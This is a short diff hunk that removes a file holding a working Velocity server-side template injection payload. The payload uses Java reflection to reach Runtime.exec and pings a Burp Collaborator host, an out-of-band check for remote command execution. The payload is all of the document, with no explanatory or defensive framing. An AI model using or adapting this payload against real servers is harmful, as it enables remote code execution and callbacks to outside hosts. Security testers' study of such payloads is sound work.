@@ -1,2 +1,0 @@
-#set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ping http://kd15s595h9kpq5vb1bibkg88ozuwil.burpcollaborator.net")
